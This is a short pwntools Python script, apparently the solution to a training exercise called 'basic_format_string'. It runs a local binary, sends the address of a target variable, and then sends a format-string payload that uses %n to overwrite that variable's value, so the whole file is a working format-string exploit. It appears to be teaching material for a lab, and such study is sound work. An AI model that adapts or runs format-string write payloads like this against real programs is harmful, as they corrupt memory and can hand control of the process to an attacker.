#!/usr/bin/env python

from pwn import *

io = process("./basic_format_string")

# Fill address of v varible. Determine with nm.
io.sendline(p32(0x0804a024))

# Fill format string. You need to use %n and get to 100 bytes processed until %n.
io.sendline('%30llx%llx%llx%llx%llx%lx%n')

io.interactive()
